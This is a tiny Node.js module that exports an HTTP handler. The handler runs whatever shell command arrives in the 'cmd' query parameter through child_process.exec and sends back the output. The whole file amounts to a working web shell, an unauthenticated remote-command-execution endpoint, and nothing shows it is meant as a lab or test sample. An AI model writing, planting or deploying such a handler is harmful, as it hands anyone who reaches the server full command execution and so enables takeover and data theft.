const cp = require("child_process");

function handler(req, res) {
  const cmd = req.query.cmd;
  cp.exec(cmd, function (_err, stdout) {
    res.end(stdout);
  });
}

module.exports = { handler };

